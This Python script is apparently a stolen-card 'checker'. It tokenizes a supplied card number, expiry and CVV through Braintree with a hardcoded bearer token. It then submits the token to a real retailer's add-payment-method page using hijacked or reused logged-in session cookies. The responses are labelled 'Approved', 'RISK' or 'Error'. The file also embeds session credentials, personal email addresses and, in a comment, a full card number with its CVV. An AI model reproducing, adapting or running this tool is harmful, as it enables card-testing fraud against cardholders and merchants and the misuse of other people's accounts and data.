def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()










































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzA2MzA2ODEsImp0aSI6ImNkMjlmNWJkLTJjYmMtNDg2NC1hMzU3LTgxZTkxMmU4NWFiMSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.tz_fwwTy2D-4VuiEje0rWcpNQvMFCEb8JMwkTCGu2Sg0mB775IRYj-M1LZ-UUY0VE_aoYiLvVB5SGOH8QpUQhg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '50dca082-0903-4a84-8295-d26297607989',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"50dca082-0903-4a84-8295-d26297607989"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581684320930","expirationMonth":"12","expirationYear":"2024","cvv":"170"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
#2








	cookies = {
    '_gcl_au': '1.1.1884805934.1729976321',
    '_ga': 'GA1.1.1428833298.1729976322',
    'woocommerce_current_currency': 'GBP',
    'nitroCachedPage': '0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-11-02%2010%3A23%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-11-02%2010%3A23%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'mailchimp.cart.previous_email': 'hjid00995@gmail.com',
    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'hjid00995%7C1731753392%7CUtD76DGAyuQYHMYcrqbA5hWKW90JvUqKRr48BJDqASc%7C77fd7dc14c152cfb01920c45ee48f77940245a01a02035ef5983240d757ea58c',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
    'mailchimp.cart.current_email': 'moh5527vbnm@gmail.com',
    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
    'mailchimp_user_email': 'hjid00995%40gmail.com',
    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
    '_ga_81KZY32HGV': 'GS1.1.1730542984.8.1.1730544281.60.0.0',
    '_ga_0YYGQ7K779': 'GS1.1.1730542984.8.1.1730544325.0.0.0',
}

	headers = {
    'authority': 'www.tea-and-coffee.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.1884805934.1729976321; _ga=GA1.1.1428833298.1729976322; woocommerce_current_currency=GBP; nitroCachedPage=0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-02%2010%3A23%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-02%2010%3A23%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.previous_email=hjid00995@gmail.com; wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db=hjid00995%7C1731753392%7CUtD76DGAyuQYHMYcrqbA5hWKW90JvUqKRr48BJDqASc%7C77fd7dc14c152cfb01920c45ee48f77940245a01a02035ef5983240d757ea58c; mailchimp_landing_site=https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; mailchimp.cart.current_email=moh5527vbnm@gmail.com; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=hjid00995%40gmail.com; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; _ga_81KZY32HGV=GS1.1.1730542984.8.1.1730544281.60.0.0; _ga_0YYGQ7K779=GS1.1.1730542984.8.1.1730544325.0.0.0',
    'origin': 'https://www.tea-and-coffee.com',
    'pragma': 'no-cache',
    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'ad476d3d07',
    '_wp_http_referer': '/account/add-payment-method',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://www.tea-and-coffee.com/account/add-payment-method', cookies=cookies, headers=headers, data=data)
    
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

